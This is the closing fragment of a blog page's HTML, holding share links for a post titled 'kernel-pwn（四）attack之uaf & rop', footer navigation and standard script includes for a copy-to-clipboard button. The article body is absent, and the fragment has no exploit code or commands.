  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;title=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;is_video=false&amp;description=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=kernel-pwn（四）attack之uaf &amp; rop&amp;body=Check out this article: http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;title=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;title=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;title=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;title=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;name=kernel-pwn（四）attack之uaf &amp; rop&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;t=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright ©
    
    
    2021-2023
    z1r0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->



<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>